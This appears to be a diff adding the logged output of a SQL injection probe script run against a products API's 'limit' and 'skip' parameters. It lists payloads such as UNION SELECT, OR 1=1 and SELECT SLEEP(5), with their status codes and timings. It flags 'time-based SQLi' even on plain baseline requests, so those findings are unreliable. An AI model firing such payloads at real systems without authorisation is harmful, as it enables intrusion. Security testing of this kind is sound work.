@@ -1,0 +1,24 @@
+# command: python3 tool_outputs/test_products_sqli.py
+# tool: python3
+# exit_code: 0
+# ts: 2026-09-29T14:44:24.178913+00:00
+# ---
+
+=== Testing limit parameter ===
+limit=10... Status: 200, Time: 32.29s, Len: 2670
+  *** TIME-BASED SQLi DETECTED ***
+limit=10 UNION SELECT 1,2,3,4,5,6,7,... Status: 422, Time: 36.59s, Len: 186
+  *** TIME-BASED SQLi DETECTED ***
+limit=10 OR 1=1... Status: 422, Time: 2.93s, Len: 157
+limit=10' OR '1'='1... Status: 422, Time: 2.10s, Len: 161
+limit=10; SELECT SLEEP(5)--... Status: 422, Time: 1.52s, Len: 169
+limit=10 AND (SELECT 1 FROM (SELECT ... Status: 422, Time: 2.23s, Len: 191
+
+=== Testing skip parameter ===
+skip=10... Status: 200, Time: 4.31s, Len: 2615
+  *** TIME-BASED SQLi DETECTED ***
+skip=10 UNION SELECT 1,2,3,4,5,6,7,... Status: 422, Time: 1.45s, Len: 185
+skip=10 OR 1=1... Status: 422, Time: 2.46s, Len: 156
+skip=10' OR '1'='1... Status: 422, Time: 1.38s, Len: 160
+skip=10; SELECT SLEEP(5)--... Status: 422, Time: 0.94s, Len: 168
+skip=10 AND (SELECT 1 FROM (SELECT ... Status: 422, Time: 1.12s, Len: 190
